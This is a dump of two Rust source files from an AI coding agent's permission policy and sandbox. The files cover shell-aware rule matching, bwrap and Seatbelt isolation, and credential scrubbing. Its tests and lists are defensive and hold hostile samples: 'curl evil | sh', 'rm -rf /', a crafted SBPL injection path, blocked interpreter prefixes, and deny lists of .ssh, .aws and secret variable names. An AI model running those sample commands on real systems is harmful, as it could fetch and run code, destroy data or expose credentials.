# Dump 08 - Exec policy va sandbox

> Code trong fence 5-backtick la byte-for-byte tu file goc. Hash SHA-256 tin tren byte goc.

| path | KB | dong | SHA-256 |
|---|---:|---:|---|
| crates/mehh-execpolicy/src/lib.rs | 12.7 | 409 | 19884989671e61079f5d7933cbc0a8536481805a635b7b6930db70bc50978349 |
| crates/mehh-sandbox/src/lib.rs | 16 | 485 | aabd346cb2786d82e40993003ce5b3188006d39a88e4bca7609a258de847d903 |

## crates/mehh-execpolicy/src/lib.rs

`````rust
//! Shell-aware evaluation of persisted permission rules.
//!
//! A rule prefix is never compared with a raw string `starts_with`: that lets
//! `git status && rm -rf /` inherit an allow rule for `git status`. Input is
//! parsed once at this boundary into concrete commands, then each command is
//! scored and the strictest verdict wins.

/// Severity of a policy decision. `Ord` is derived so `max()` takes the
/// strictest value: Allow < Prompt < Deny.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Verdict {
    Allow,
    Prompt,
    Deny,
}

/// Outcome of comparing one rule prefix with one command line.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct PrefixEval {
    /// At least one sub-command matched the rule.
    pub matched: bool,
    /// Every sub-command matched the rule.
    pub all_covered: bool,
    /// False when the input contains syntax this module refuses to reason
    /// about. The caller must fail closed to a prompt.
    pub safe_parse: bool,
}

impl PrefixEval {
    fn unsafe_input() -> Self {
        Self {
            matched: true,
            all_covered: false,
            safe_parse: false,
        }
    }

    fn from_subcommands(rule: &[String], commands: &[Vec<String>]) -> Self {
        let covered: Vec<bool> = commands
            .iter()
            .map(|cmd| prefix_matches(rule, cmd))
            .collect();
        Self {
            all_covered: covered.iter().all(|c| *c),
            matched: covered.iter().any(|c| *c),
            safe_parse: true,
        }
    }
}

/// Shell assignment word: `NAME=value` where NAME is a valid identifier.
/// A shell applies these before running the real executable, so a rule cannot
/// score the command that follows.
fn is_assignment_word(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Push a completed token, refusing an assignment word in executable position.
fn push_token(current: &mut Vec<String>, token: &mut String) -> bool {
    if current.is_empty() && is_assignment_word(token) {
        return false;
    }
    current.push(std::mem::take(token));
    true
}

/// Tokenize a shell command line into concrete sub-commands.
///
/// Returns `None` for constructs that cannot be scored safely: command or
/// parameter expansion, backticks, redirection, assignment words in executable
/// position, unterminated quotes, or a trailing escape. Shell `&&`, `||`, `;`,
/// `|`, `&` and newlines split sub-commands.
fn split_commands(input: &str) -> Option<Vec<Vec<String>>> {
    let mut commands: Vec<Vec<String>> = Vec::new();
    let mut current: Vec<String> = Vec::new();
    let mut token = String::new();
    let mut has_token = false;
    let mut quote: Option<char> = None;
    let mut chars = input.chars();

    while let Some(ch) = chars.next() {
        match quote {
            Some(q) => {
                if ch == q {
                    quote = None;
                } else if ch == '\\' && q == '"' {
                    token.push(chars.next()?);
                } else {
                    token.push(ch);
                }
                has_token = true;
            }
            None => match ch {
                '\'' | '"' => {
                    quote = Some(ch);
                    has_token = true;
                }
                '\\' => {
                    token.push(chars.next()?);
                    has_token = true;
                }
                '$' => return None,
                '`' | '>' | '<' => return None,
                ';' | '&' | '|' | '\n' => {
                    if has_token {
                        if !push_token(&mut current, &mut token) {
                            return None;
                        }
                        has_token = false;
                    }
                    if !current.is_empty() {
                        commands.push(std::mem::take(&mut current));
                    }
                }
                c if c.is_whitespace() => {
                    if has_token {
                        if !push_token(&mut current, &mut token) {
                            return None;
                        }
                        has_token = false;
                    }
                }
                c => {
                    token.push(c);
                    has_token = true;
                }
            },
        }
    }

    if quote.is_some() || (!input.is_empty() && input.ends_with('\\')) {
        return None;
    }
    if has_token && !push_token(&mut current, &mut token) {
        return None;
    }
    if !current.is_empty() {
        commands.push(current);
    }
    if commands.is_empty() {
        None
    } else {
        Some(commands)
    }
}

/// Windows-compatible executable key: ASCII-lowercased, extension stripped,
/// Unicode-lowercased. Path components are dropped so `/usr/bin/git` and
/// `C:\tools\git.exe` both key to `git`.
pub fn executable_key(name: &str) -> String {
    let basename = name.rsplit(['/', '\\']).next().unwrap_or(name);
    let lower = basename.to_lowercase();
    for ext in [".exe", ".cmd", ".bat", ".com"] {
        if let Some(stem) = lower.strip_suffix(ext) {
            return stem.to_string();
        }
    }
    lower
}

fn token_eq(a: &str, b: &str) -> bool {
    // `-`-prefixed flags are case-insensitive on every platform; on Windows
    // every token is case-insensitive (`/K` vs `/k`). An absolute path such as
    // `/tmp/Foo` is an argument, not a flag, and stays case-sensitive on POSIX.
    let flag = a.starts_with('-') || b.starts_with('-');
    if cfg!(windows) || flag {
        a.eq_ignore_ascii_case(b)
    } else {
        a == b
    }
}

fn prefix_matches(rule: &[String], command: &[String]) -> bool {
    if rule.is_empty() || command.is_empty() || rule.len() > command.len() {
        return false;
    }
    if executable_key(&rule[0]) != executable_key(&command[0]) {
        return false;
    }
    rule[1..]
        .iter()
        .zip(&command[1..])
        .all(|(a, b)| token_eq(a, b))
}

/// Compare a persisted `arg_prefix` with a command line.
pub fn check_prefix(rule_prefix: &str, command: &str) -> PrefixEval {
    let rule = match split_commands(rule_prefix) {
        Some(mut c) if c.len() == 1 => c.remove(0),
        _ => return PrefixEval::unsafe_input(),
    };
    let commands = match split_commands(command) {
        Some(c) => c,
        None => return PrefixEval::unsafe_input(),
    };
    PrefixEval::from_subcommands(&rule, &commands)
}

/// Turn a verdict from a rule into the verdict for the whole command line.
pub fn verdict_for(eval: PrefixEval, action_allows: bool) -> Verdict {
    if !eval.safe_parse {
        return Verdict::Prompt;
    }
    if action_allows {
        if eval.all_covered {
            Verdict::Allow
        } else if eval.matched {
            Verdict::Prompt
        } else {
            Verdict::Allow
        }
    } else if eval.matched {
        Verdict::Deny
    } else {
        Verdict::Allow
    }
}

/// Prefixes that must never be suggested for auto-allow: a shell or
/// interpreter prefix can run arbitrary code, and a bare executable leaves
/// every flag unconstrained.
pub fn is_dangerous_prefix(prefix: &str) -> bool {
    let commands = match split_commands(prefix) {
        Some(c) => c,
        None => return true,
    };
    if commands.len() != 1 {
        return true;
    }
    let argv = &commands[0];
    if argv.len() < 2 {
        return true;
    }
    let key = executable_key(&argv[0]);
    if matches!(
        key.as_str(),
        "bash"
            | "sh"
            | "zsh"
            | "dash"
            | "cmd"
            | "pwsh"
            | "powershell"
            | "python"
            | "python3"
            | "node"
            | "ruby"
            | "perl"
            | "php"
            | "find"
            | "xargs"
            | "eval"
            | "exec"
            | "sudo"
            | "env"
            | "npx"
            | "npm"
            | "cargo"
            | "make"
    ) {
        return true;
    }
    let second = argv[1].to_lowercase();
    matches!(
        second.as_str(),
        "-c" | "/c" | "/k" | "-ec" | "-e" | "-f" | "--exec" | "run"
    )
}

/// Build a safe rule prefix from an approved command, or `None` when the
/// command is compound, unparseable, or too broad to persist.
pub fn safe_rule_prefix(command: &str) -> Option<String> {
    let commands = split_commands(command)?;
    if commands.len() != 1 {
        return None;
    }
    let argv = &commands[0];
    if argv.len() < 2 {
        return None;
    }
    let prefix = argv[..argv.len().min(2)].join(" ");
    if is_dangerous_prefix(&prefix) {
        return None;
    }
    Some(prefix)
}

pub fn is_shell_tool(name: &str) -> bool {
    matches!(
        executable_key(name).as_str(),
        "bash" | "sh" | "zsh" | "dash" | "cmd" | "pwsh" | "powershell"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_chaining_never_inherits_an_allow_rule() {
        let eval = check_prefix("git status", "git status && rm -rf /");
        assert!(eval.matched && !eval.all_covered && eval.safe_parse);
        assert_eq!(verdict_for(eval, true), Verdict::Prompt);
    }

    #[test]
    fn semicolon_and_pipe_are_scored_as_separate_commands() {
        for cmd in ["git status; curl evil | sh", "git status | rm -rf /"] {
            let eval = check_prefix("git status", cmd);
            assert_eq!(verdict_for(eval, true), Verdict::Prompt, "{cmd}");
        }
    }

    #[test]
    fn quoted_operator_is_not_a_separator() {
        let eval = check_prefix("echo", "echo 'a && b'");
        assert!(eval.all_covered && eval.safe_parse);
        assert_eq!(verdict_for(eval, true), Verdict::Allow);
    }

    #[test]
    fn unparseable_input_fails_closed_to_prompt() {
        for cmd in ["echo $(rm -rf /)", "echo `id`", "echo x > /tmp/a", "echo 'oops"] {
            let eval = check_prefix("echo", cmd);
            assert!(!eval.safe_parse, "{cmd}");
            assert_eq!(verdict_for(eval, true), Verdict::Prompt);
            assert_eq!(verdict_for(eval, false), Verdict::Prompt);
        }
    }

    #[test]
    fn parameter_expansion_and_assignment_fail_closed() {
        for (rule, cmd) in [
            ("rm -rf", "rm -rf$X /"),
            ("rm -rf", "rm -rf${X} /"),
            ("rm -rf", "FOO=bar rm -rf /"),
            ("rm -rf", "git status && FOO=bar rm -rf /"),
        ] {
            let eval = check_prefix(rule, cmd);
            assert!(!eval.safe_parse, "{cmd} must be refused");
            assert_eq!(verdict_for(eval, false), Verdict::Prompt, "{cmd}");
        }
        // Quoted dollars are literal, so they remain scorable.
        assert!(check_prefix("echo", "echo '$HOME'").safe_parse);
    }

    #[test]
    fn windows_extension_and_case_do_not_bypass_a_rule() {
        // Executable case/extension normalization applies on every platform.
        // `/k` is a case-insensitive flag only on Windows, so POSIX uses `-k`.
        let (rule, cmd) = if cfg!(windows) {
            ("CMD.EXE /k", "cmd.exe /K whoami")
        } else {
            ("CMD.EXE -k", "cmd.exe -K whoami")
        };
        let eval = check_prefix(rule, cmd);
        assert!(eval.all_covered, "case/extension must be normalized");
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[test]
    fn absolute_path_does_not_bypass_a_basename_deny_rule() {
        let eval = check_prefix("git push", "/usr/bin/git push --force origin main");
        assert!(eval.all_covered);
        assert_eq!(verdict_for(eval, false), Verdict::Deny);
    }

    #[test]
    fn absolute_path_argument_case_sensitivity_follows_platform() {
        let eval = check_prefix("cat /tmp/Secret", "cat /tmp/secret");
        assert!(eval.safe_parse);
        assert_eq!(
            eval.all_covered,
            cfg!(windows),
            "POSIX path arguments are case-sensitive; Windows tokens are not"
        );
    }

    #[test]
    fn dangerous_prefixes_are_never_persisted() {
        for cmd in [
            "git",
            "git -c core.sshCommand=evil push",
            "bash -c 'rm -rf /'",
            "cmd.exe /k calc",
            "pwsh -ec aWQ=",
            "python -c pass",
            "node -e 1",
            "find /tmp -exec rm {} +",
            "git status && rm -rf /",
        ] {
            assert!(
                safe_rule_prefix(cmd).is_none(),
                "must not persist a rule for {cmd}"
            );
        }
    }

    #[test]
    fn safe_prefix_is_kept() {
        assert_eq!(safe_rule_prefix("git status --short"), Some("git status".into()));
        assert_eq!(safe_rule_prefix("ls -la"), Some("ls -la".into()));
    }
}
`````

## crates/mehh-sandbox/src/lib.rs

`````rust
//! Kernel-level sandbox planning for shell tools.
//!
//! The policy is deliberately separate from approval: approval decides
//! whether a command may run, this module decides what it can reach once it
//! runs. Every backend reports whether isolation is actually active; a
//! degraded backend never pretends to be safe.

use std::path::{Path, PathBuf};

/// Access level granted to a spawned command.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SandboxPolicy {
    /// Read workspace and system, no writes, no network.
    ReadOnly,
    /// Write only inside `cwd` (plus its own temp area), no network by default.
    WorkspaceWrite,
    /// Explicitly opted out. No kernel restrictions are applied.
    DangerFullAccess,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SandboxError(String);

impl SandboxError {
    fn new(msg: impl Into<String>) -> Self {
        Self(msg.into())
    }
}

impl std::fmt::Display for SandboxError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for SandboxError {}

/// What isolation is really in force for a spawn.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SandboxStatus {
    Active(String),
    Degraded(String),
}

impl SandboxStatus {
    pub fn degraded_reason(&self) -> Option<&str> {
        match self {
            SandboxStatus::Active(_) => None,
            SandboxStatus::Degraded(reason) => Some(reason),
        }
    }

    pub fn is_active(&self) -> bool {
        matches!(self, SandboxStatus::Active(_))
    }
}

/// A spawn after policy has been applied to it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SandboxInvocation {
    pub program: String,
    pub args: Vec<String>,
    pub status: SandboxStatus,
}

#[derive(Debug, Clone)]
pub struct SandboxPlan {
    pub policy: SandboxPolicy,
    pub cwd: PathBuf,
    /// Paths mounted read-only or masked even when they do not exist yet.
    pub protected_paths: Vec<PathBuf>,
    /// Paths whose contents must never be readable by the child.
    pub deny_read_paths: Vec<PathBuf>,
    pub env_denylist: Vec<String>,
    pub network: bool,
}

const PROTECTED_NAMES: &[&str] = &[".git", ".mehh", ".agents", ".codex"];
const MAX_ENV_FILES: usize = 256;
const MAX_WALK_DEPTH: usize = 6;

impl SandboxPlan {
    pub fn new(policy: SandboxPolicy, cwd: impl Into<PathBuf>) -> Self {
        let cwd = cwd.into();
        let mut protected_paths: Vec<PathBuf> = PROTECTED_NAMES
            .iter()
            .map(|name| cwd.join(name))
            .collect();
        let mut deny_read_paths = Vec::new();

        if let Some(home) = home_dir() {
            deny_read_paths.push(home.join(".ssh"));
            deny_read_paths.push(home.join(".aws"));
            deny_read_paths.push(home.join(".mehh").join("agent").join("auth.json"));
            protected_paths.push(home.join(".mehh").join("agent").join("permissions.json"));
        }
        deny_read_paths.extend(find_env_files(&cwd));

        Self {
            policy,
            cwd,
            protected_paths,
            deny_read_paths,
            env_denylist: default_env_denylist(),
            network: matches!(policy, SandboxPolicy::DangerFullAccess),
        }
    }

    /// Fail-closed check before any ACL or mount is handed to a child.
    pub fn prepare(&self) -> Result<PreparedSandbox, SandboxError> {
        let cwd = self
            .cwd
            .canonicalize()
            .map_err(|e| SandboxError::new(format!("cannot canonicalize cwd: {e}")))?;
        if !cwd.is_dir() {
            return Err(SandboxError::new("cwd is not a directory"));
        }
        for path in self
            .protected_paths
            .iter()
            .chain(self.deny_read_paths.iter())
        {
            if path_through_writable_symlink(path, &cwd)? {
                return Err(SandboxError::new(format!(
                    "refusing sandbox: protected path {} is reachable through a writable symlink",
                    path.display()
                )));
            }
        }
        Ok(PreparedSandbox { cwd })
    }
}

pub struct PreparedSandbox {
    cwd: PathBuf,
}

impl PreparedSandbox {
    pub fn cwd(&self) -> &Path {
        &self.cwd
    }
}

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("USERPROFILE")
        .or_else(|| std::env::var_os("HOME"))
        .filter(|s| !s.is_empty())
        .map(PathBuf::from)
}

/// Walk a bounded tree for `.env` files. Bounded depth and match count keep
/// startup predictable on large repositories.
fn find_env_files(root: &Path) -> Vec<PathBuf> {
    fn visit(dir: &Path, depth: usize, out: &mut Vec<PathBuf>) {
        if depth > MAX_WALK_DEPTH || out.len() >= MAX_ENV_FILES {
            return;
        }
        let entries = match std::fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(_) => return,
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name();
            let name_s = name.to_string_lossy();
            if name_s == ".env" || name_s.ends_with(".env") {
                out.push(path.clone());
                if out.len() >= MAX_ENV_FILES {
                    return;
                }
            }
            if path.is_dir() && !path.is_symlink() {
                visit(&path, depth + 1, out);
            }
        }
    }
    let mut out = Vec::new();
    visit(root, 0, &mut out);
    out
}

/// A protected path that crosses a symlink located inside the writable root
/// can be redirected by the child after policy evaluation (TOCTTOU).
fn path_through_writable_symlink(path: &Path, writable_root: &Path) -> Result<bool, SandboxError> {
    let mut cursor = path;
    loop {
        match std::fs::symlink_metadata(cursor) {
            Ok(meta) if meta.file_type().is_symlink() => {
                let target = std::fs::read_link(cursor)
                    .map_err(|e| SandboxError::new(format!("cannot read symlink {}: {e}", cursor.display())))?;
                let resolved = if target.is_absolute() {
                    target
                } else {
                    cursor.parent().unwrap_or(Path::new(".")).join(target)
                };
                if resolved.starts_with(writable_root) {
                    return Ok(true);
                }
            }
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => {
                return Err(SandboxError::new(format!(
                    "cannot inspect {}: {e}",
                    cursor.display()
                )))
            }
        }
        if cursor == writable_root || cursor.parent() == Some(writable_root) {
            break;
        }
        match cursor.parent() {
            Some(parent) => cursor = parent,
            None => break,
        }
    }
    Ok(false)
}

pub fn default_env_denylist() -> Vec<String> {
    vec![
        "*_API_KEY".into(),
        "*_SECRET".into(),
        "*_TOKEN".into(),
        "AWS_*".into(),
        "GITHUB_TOKEN".into(),
        "GH_TOKEN".into(),
        "OPENAI_API_KEY".into(),
        "ANTHROPIC_API_KEY".into(),
        "GOOGLE_API_KEY".into(),
    ]
}

/// Keys matching the denylist are removed before a child is spawned so build
/// scripts and `npm test` cannot exfiltrate the agent's credentials.
pub fn is_secret_env_key(key: &str) -> bool {
    let upper = key.to_ascii_uppercase();
    upper.ends_with("_API_KEY")
        || upper.ends_with("_SECRET")
        || upper.ends_with("_TOKEN")
        || upper.starts_with("AWS_")
        || matches!(
            upper.as_str(),
            "GITHUB_TOKEN"
                | "GH_TOKEN"
                | "OPENAI_API_KEY"
                | "ANTHROPIC_API_KEY"
                | "GOOGLE_API_KEY"
                | "MEHH_API_KEY"
        )
}

fn find_in_path(binary: &str) -> Option<PathBuf> {
    let paths = std::env::var_os("PATH")?;
    for dir in std::env::split_paths(&paths) {
        let candidate = dir.join(binary);
        if candidate.is_file() {
            return Some(candidate);
        }
    }
    None
}

fn linux_wrapper(plan: &SandboxPlan, prepared: &PreparedSandbox) -> Option<(String, Vec<String>)> {
    let bwrap = find_in_path("bwrap")?;
    let mut args = vec![
        "--new-session".to_string(),
        "--die-with-parent".to_string(),
        "--unshare-user".to_string(),
        "--unshare-pid".to_string(),
        "--unshare-ipc".to_string(),
    ];
    if !plan.network {
        args.push("--unshare-net".to_string());
    }
    args.push("--cap-drop".to_string());
    args.push("ALL".to_string());
    args.push("--ro-bind".to_string());
    args.push("/".to_string());
    args.push("/".to_string());
    args.push("--dev".to_string());
    args.push("/dev".to_string());
    args.push("--bind".to_string());
    let cwd = prepared.cwd().to_string_lossy().into_owned();
    args.push(cwd.clone());
    args.push(cwd.clone());

    for path in &plan.protected_paths {
        let rendered = path.to_string_lossy().into_owned();
        if path.exists() {
            args.push("--ro-bind".to_string());
            args.push(rendered.clone());
            args.push(rendered);
        } else {
            // Mask paths that do not exist yet: without this the child can
            // create `.git/hooks` or a fake permissions file itself.
            args.push("--tmpfs".to_string());
            args.push(rendered);
        }
    }
    for path in &plan.deny_read_paths {
        let rendered = path.to_string_lossy().into_owned();
        args.push("--tmpfs".to_string());
        args.push(rendered);
    }
    // WSL interop lets a Linux process escape by calling powershell.exe.
    for wsl_path in ["/run/WSL", "/mnt/wslg/distro"] {
        if Path::new(wsl_path).exists() {
            args.push("--tmpfs".to_string());
            args.push(wsl_path.to_string());
        }
    }
    args.push("--".to_string());
    Some((bwrap.to_string_lossy().into_owned(), args))
}

/// Apply the plan to a command. Never silently drops restrictions: if no
/// kernel backend is available the returned status is `Degraded`.
pub fn wrap(
    plan: &SandboxPlan,
    program: &str,
    args: &[String],
) -> Result<SandboxInvocation, SandboxError> {
    if plan.policy == SandboxPolicy::DangerFullAccess {
        return Ok(SandboxInvocation {
            program: program.to_string(),
            args: args.to_vec(),
            status: SandboxStatus::Degraded("DangerFullAccess: sandbox disabled by user".into()),
        });
    }

    let prepared = plan.prepare()?;
    #[cfg(target_os = "linux")]
    let wrapper: Option<(String, Vec<String>)> = linux_wrapper(plan, &prepared);
    #[cfg(not(target_os = "linux"))]
    let wrapper: Option<(String, Vec<String>)> = None;

    if let Some((wrapper_program, mut prefix)) = wrapper {
        prefix.push(program.to_string());
        prefix.extend(args.iter().cloned());
        return Ok(SandboxInvocation {
            program: wrapper_program,
            args: prefix,
            status: SandboxStatus::Active("bwrap user namespaces + capability drop".into()),
        });
    }

    #[cfg(target_os = "macos")]
    if let Some(profile) = seatbelt_profile(plan) {
        let path = std::env::temp_dir().join(format!(
            "mehh-sandbox-{}.sbp",
            std::process::id()
        ));
        std::fs::write(&path, profile)
            .map_err(|e| SandboxError::new(format!("cannot write sandbox profile: {e}")))?;
        let mut seatbelt = vec!["-f".to_string(), path.to_string_lossy().into_owned(), "--".to_string()];
        seatbelt.push(program.to_string());
        seatbelt.extend(args.iter().cloned());
        return Ok(SandboxInvocation {
            program: "sandbox-exec".to_string(),
            args: seatbelt,
            status: SandboxStatus::Active("Seatbelt sandbox-exec profile".into()),
        });
    }

    // Windows: no privileged service or WFP driver here. Report degraded
    // instead of pretending a token restriction is kernel isolation.
    Ok(SandboxInvocation {
        program: program.to_string(),
        args: args.to_vec(),
        status: SandboxStatus::Degraded(
            "no OS sandbox backend available; environment credentials were scrubbed".into(),
        ),
    })
}

/// Escape a value for a quoted SBPL string literal. Seatbelt uses C-style
/// escapes; an unescaped quote or backslash in a path (for example an
/// attacker-controlled `.env` filename found under the workspace) could close
/// the literal and inject extra `(allow ...)` rules.
#[cfg(any(target_os = "macos", test))]
fn escape_sbpl_string(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

#[cfg(target_os = "macos")]
fn seatbelt_profile(plan: &SandboxPlan) -> Option<String> {
    let cwd = plan.cwd.canonicalize().ok()?;
    let cwd_s = escape_sbpl_string(&cwd.to_string_lossy());
    let mut profile = String::from(
        "(version 1)\n(deny default)\n(allow process-exec)\n(allow process-fork)\n\
         (allow sysctl-read)\n(allow file-read* (subpath \"/usr\") (subpath \"/System\"))\n\
         (allow file-write* (subpath \"",
    );
    profile.push_str(&cwd_s);
    profile.push_str("\"))\n");
    for path in plan.protected_paths.iter().chain(plan.deny_read_paths.iter()) {
        let escaped = escape_sbpl_string(&path.to_string_lossy());
        profile.push_str("(deny file-read* (subpath \"");
        profile.push_str(&escaped);
        profile.push_str("\"))\n(deny file-write* (subpath \"");
        profile.push_str(&escaped);
        profile.push_str("\"))\n");
    }
    Some(profile)
}

const VIOLATION_MARKERS: &[&str] = &[
    "Permission denied",
    "Read-only file system",
    "Operation not permitted",
    "Network is unreachable",
    "Bad system call",
    "SIGSYS",
    "bwrap:",
    "sandbox-exec:",
];

/// Best-effort signal that a non-zero exit was caused by the sandbox rather
/// than by the command itself. Used by the TUI to offer a one-time re-run
/// outside the sandbox; it never changes the command result on its own.
pub fn detect_violation(output: &str, exit_code: Option<i32>) -> bool {
    if exit_code == Some(0) || exit_code.is_none() {
        return false;
    }
    VIOLATION_MARKERS.iter().any(|marker| output.contains(marker))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn secret_keys_are_recognized_across_platforms() {
        for key in [
            "OPENAI_API_KEY",
            "AWS_SECRET_ACCESS_KEY",
            "GITHUB_TOKEN",
            "MY_SERVICE_SECRET",
        ] {
            assert!(is_secret_env_key(key), "{key}");
        }
        for key in ["PATH", "HOME", "USERPROFILE", "RUSTFLAGS"] {
            assert!(!is_secret_env_key(key), "{key}");
        }
    }

    #[test]
    fn sbpl_paths_cannot_inject_rules() {
        // Anchors the order: backslashes are escaped before quotes.
        assert_eq!(escape_sbpl_string("a\\b\"c"), "a\\\\b\\\"c");
        let crafted = "x.env\" (allow file-read* (subpath \"/))\\y";
        assert_eq!(
            escape_sbpl_string(crafted),
            "x.env\\\" (allow file-read* (subpath \\\"/))\\\\y"
        );
    }

    #[test]
    fn plan_masks_missing_git_directory() {
        let dir = std::env::temp_dir().join(format!("sandbox-plan-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&dir);
        let plan = SandboxPlan::new(SandboxPolicy::WorkspaceWrite, dir.clone());
        assert!(plan.protected_paths.contains(&dir.join(".git")));
        assert!(plan.protected_paths.contains(&dir.join(".mehh")));
        assert!(plan.prepare().is_ok());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn dangerous_full_access_is_reported_degraded() {
        let dir = std::env::temp_dir();
        let plan = SandboxPlan::new(SandboxPolicy::DangerFullAccess, dir.clone());
        let inv = wrap(&plan, "echo", &["hi".to_string()]).unwrap();
        assert_eq!(inv.program, "echo");
        assert!(!inv.status.is_active());
    }

    #[test]
    fn violation_needs_failure_and_marker() {
        assert!(detect_violation("Permission denied", Some(1)));
        assert!(!detect_violation("Permission denied", Some(0)));
        assert!(!detect_violation("all good", Some(1)));
    }
}
`````

